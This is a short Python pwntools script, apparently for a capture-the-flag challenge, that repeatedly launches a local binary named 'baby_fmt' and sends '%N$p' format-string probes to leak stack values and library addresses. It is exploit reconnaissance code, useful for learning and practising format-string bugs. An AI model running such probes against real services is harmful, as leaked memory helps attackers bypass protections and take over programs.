#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib

debug = not False

c = 0
pwn_file = "./baby_fmt"
elf = ELF(pwn_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
for i in range(1, 100):
    print(i)
    c = process(pwn_file)
    for k,v in c.libs().items():
        print(k, hex(v))
    c.sendline("%{}$p".format(i))
    c.recvline()
    print(c.recvline())
